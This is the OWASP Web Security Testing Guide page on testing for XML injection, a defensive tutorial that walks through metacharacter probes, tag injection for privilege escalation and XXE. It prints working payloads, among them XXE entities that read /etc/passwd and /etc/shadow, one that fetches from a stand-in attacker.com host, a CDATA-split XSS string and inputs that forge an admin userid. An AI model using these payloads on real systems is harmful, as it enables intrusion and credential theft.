# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
# Testing for XML Injection
ID  
---  
WSTG-INPV-07  
## Summary
XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.
This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).
## Test Objectives
  * Identify XML injection points.
  * Assess the types of exploits that can be attained and their severities.


## How to Test
Let’s suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `user>`node in an `xmlDb` file.
Let’s suppose the xmlDB file is like the following:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>

```

When a user registers himself by filling an HTML form, the application receives the user’s data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.
For example, the following values:
```
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com

```

will produce the request:
`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
The application, then, builds the following node:
```
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>

```

which will be added to the xmlDB:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>

```

### Discovery
The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.
XML metacharacters are:
  * Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.


As an example, let’s suppose there is the following attribute:
`<node attrib='$inputValue'/>`
So, if:
`inputValue = foo'`
is instantiated and then is inserted as the attrib value:
`<node attrib='foo''/>`
then, the resulting XML document is not well formed.
  * Double quote: `"` - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.


`<node attrib="$inputValue"/>`
So if:
`$inputValue = foo"`
the substitution gives:
`<node attrib="foo""/>`
and the resulting XML document is invalid.
  * Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:


`Username = foo<`
the application will build a new node:
```
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>

```

but, because of the presence of the open ‘<’, the resulting XML document is invalid.
  * Comment tag: `<!--/-->` - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:


`Username = foo<!--`
the application will build a node like the following:
```
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>

```

which won’t be a valid XML sequence.
  * Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.


For example:
`<tagnode>&lt;</tagnode>`
is well formed and valid, and represents the `<` ASCII character.
If `&` is not encoded itself with `&amp;`, it could be used to test XML injection.
In fact, if an input like the following is provided:
`Username = &foo`
a new node will be created:
```
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>

```

but, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.
  * CDATA section delimiters: `<!\[CDATA\[ / ]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.


For example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:
```
<node>
    <![CDATA[<foo>]]>
</node>

```

so that `<foo>` won’t be parsed as markup and will be considered as character data.
If a node is created in the following way:
`<username><![CDATA[<$userName]]></username>`
the tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.
`userName = ]]>`
this will become:
`<username><![CDATA[]]>]]></username>`
which is not a valid XML fragment.
Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.
Let’s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.
```
<html>
    $HTMLCode
</html>

```

Then, an attacker can provide the following input:
`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
and obtain the following node:
```
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>

```

During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:
```
<script>
    alert('XSS')
</script>

```

The result is that the application is vulnerable to XSS.
External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
To test for XXE vulnerabilities, one can use the following input:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>

```

This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.
Other useful tests are the following:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>

```

### Tag Injection
Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
Let’s considering the previous application. By inserting the following values:
```
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com

```

the application will build a new node and append it to the XML database:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>

```

The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.
The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don’t comply with it.
Let’s suppose that the XML document is specified by the following DTD:
```
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>

```

Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.
However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:
```
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com

```

In this case, the final XML database is:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>

```

The original `userid` node has been commented out, leaving only the injected one. The document now complies with its DTD rules.
## Source Code Review
The following Java API may be vulnerable to XXE if they are not configured properly.
```
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser

```

Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.
  * [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)


In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.
The version of POI library can be identified from the filename of the JAR. For example,
  * `poi-3.8.jar`
  * `poi-ooxml-3.8.jar`


The followings source code keyword may apply to C.
  * libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
  * libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader


## Tools
  * [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)


## Spotlight: Fujitsu Limited
[![image](https://owasp.org/assets/images/corp-member-logo/FujitsuLimited.png)](https://global.fujitsu/en-global)
The Fujitsu Group has operations in different regions around the world, including Japan, and provides digital services globally. We have built large-scale, cutting-edge systems that leverage our advanced technologies and extensive track record, garnering the No. 1 market share in Japan and a top-class position worldwide in the IT services field.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/Root.png)](https://www.root.io/)[![image](https://owasp.org/assets/images/corp-member-logo/Zimperiumlogo_300x90px.jpeg)](https://www.zimperium.com/)[![image](https://owasp.org/assets/images/corp-member-logo/blended_logoowasp.png)](http://blend-ed.com)[![image](https://owasp.org/assets/images/corp-member-logo/Cobalt.png)](https://www.cobalt.io/)[![image](https://owasp.org/assets/images/corp-member-logo/tenable_logo.png)](https://www.tenable.com)[![image](https://owasp.org/assets/images/corp-member-logo/invicti_logo_300x90_black.png)](https://www.invicti.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Traefik.png)](https://traefik.io/)[![image](https://owasp.org/assets/images/corp-member-logo/SecureCodeWarrior.png)](https://www.securecodewarrior.com/)[![image](https://owasp.org/assets/images/corp-member-logo/PhoenixSecurity.svg)](https://phoenix.security/)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
